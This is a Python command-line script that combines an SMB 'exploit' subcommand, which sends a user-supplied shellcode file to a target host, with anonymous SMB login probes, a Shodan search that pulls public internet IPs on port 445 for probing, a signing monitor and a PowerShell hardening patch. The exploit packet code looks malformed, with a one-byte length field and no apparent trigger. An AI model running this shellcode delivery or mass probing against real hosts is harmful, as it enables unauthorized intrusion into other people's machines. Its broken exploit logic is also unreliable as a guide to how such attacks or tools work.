#!/usr/bin/env python3
# upgrade5_flow.py
"""
Unified SMBv2/v3 flow: probe → exploit → monitor → patch → firewall → public.
"""

import argparse, logging, struct, socket, os, time, subprocess, requests, json
from typing import Tuple, List

# ---------------- Threat PoC (unchanged) ----------------
NEGOTIATE = (
    b"\x00\x00\x00\x90"
    b"\xfeSMB"
    b"\x40\x00\x00\x00"
    b"\x00"*8
    b"\x00\x00"
    b"\x00\x00"
    b"\x00"*8
    b"\x24\x00"
    b"\x00\x00"
    b"\x00\x00\x00\x00"
    b"\x00"*64
)

def exploit(host: str, port: int, payload: str) -> None:
    sock = socket.create_connection((host, port))
    sock.sendall(NEGOTIATE)
    sock.recv(1024)
    shell = open(payload, 'rb').read()
    pkt = b"\x00\x00\x00" + struct.pack(">B", len(shell)) + shell
    sock.sendall(pkt)
    sock.close()
    logging.info("payload sent")

# ---------------- Threat-model probe (unchanged) ----------------
def probe_smb(host: str, port: int) -> Tuple[int, bool]:
    from impacket.smbconnection import SMBConnection
    smb = SMBConnection(remoteName=host, remoteHost=host, sess_port=port)
    smb.login('', '')
    d, s = smb.getDialect(), smb.isSigningRequired()
    smb.close()
    return d, s

# ---------------- Persistent signing monitor ----------------
REG = r"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters"
def monitor_signing(interval: int) -> None:
    while True:
        try:
            out = subprocess.check_output(
                ["reg", "query", REG, "/v", "RequireSecuritySignature"],
                stderr=subprocess.DEVNULL, text=True
            )
            if "0x0" in out:
                logging.warning("SMB signing disabled")
            else:
                logging.info("SMB signing enforced")
        except Exception as e:
            logging.error(e)
        time.sleep(interval)

# ---------------- Hardening patch (unchanged) ----------------
PATCH = r"""
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" `
    -Name "RequireSecuritySignature" -Type DWord -Value 1
Set-SmbServerConfiguration -EnableSMB1Protocol $false -EnableSMB2Protocol $true -Force
Set-SmbServerConfiguration -EncryptData $true -RejectUnencryptedAccess $true -Force
Restart-Service -Name lanmanserver
Write-Output "SMB hardening applied"
"""
def apply_patch() -> None:
    subprocess.check_call(["powershell", "-NoLogo", "-NonInteractive", "-Command", PATCH])

# ---------------- Firewall probe ----------------
def firewall_probe(host: str, port: int, timeout: int = 3) -> bool:
    try:
        sock = socket.create_connection((host, port), timeout=timeout)
        sock.close()
        return True
    except (socket.timeout, ConnectionRefusedError, OSError):
        return False

# ---------------- Public internet scan ----------------
SHODAN_URL = "https://api.shodan.io/shodan/host/search"
def internet_scan(query: str, limit: int) -> List[str]:
    key = os.getenv("SHODAN_API_KEY")
    if not key:
        raise RuntimeError("SHODAN_API_KEY not set")
    r = requests.get(SHODAN_URL, params={"key": key, "query": query, "limit": limit})
    r.raise_for_status()
    return [m["ip_str"] for m in r.json().get("matches", [])]

def public_flow(query: str, limit: int, port: int, timeout: int) -> None:
    for ip in internet_scan(query, limit):
        if not firewall_probe(ip, port, timeout):
            logging.info("%s port %d filtered", ip, port)
            continue
        try:
            d, s = probe_smb(ip, port)
            logging.info("%s SMB%d signing %s", ip, d, "required" if s else "disabled")
        except Exception as e:
            logging.error("%s %s", ip, e)

# ---------------- CLI dispatcher ------------------------
def main() -> None:
    parser = argparse.ArgumentParser()
    sub = parser.add_subparsers(dest="cmd", required=True)

    p1 = sub.add_parser("probe")
    p1.add_argument("--host", required=True)
    p1.add_argument("--port", type=int, default=445)

    p2 = sub.add_parser("exploit")
    p2.add_argument("--host", required=True)
    p2.add_argument("--port", type=int, default=445)
    p2.add_argument("--payload", default="shell.bin")

    p3 = sub.add_parser("monitor")
    p3.add_argument("--interval", type=int, default=300)

    sub.add_parser("patch")

    p4 = sub.add_parser("public")
    p4.add_argument("--query", default="port:445 product:Microsoft-SMB")
    p4.add_argument("--limit", type=int, default=50)
    p4.add_argument("--port", type=int, default=445)
    p4.add_argument("--timeout", type=int, default=3)

    args = parser.parse_args()
    logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)s %(message)s")

    if args.cmd == "probe":
        d, s = probe_smb(args.host, args.port)
        print(f"Dialect SMB{d}, signing {'required' if s else 'disabled'}")
    elif args.cmd == "exploit":
        exploit(args.host, args.port, args.payload)
    elif args.cmd == "monitor":
        monitor_signing(args.interval)
    elif args.cmd == "patch":
        apply_patch()
    elif args.cmd == "public":
        public_flow(args.query, args.limit, args.port, args.timeout)

if __name__ == "__main__":
    main()
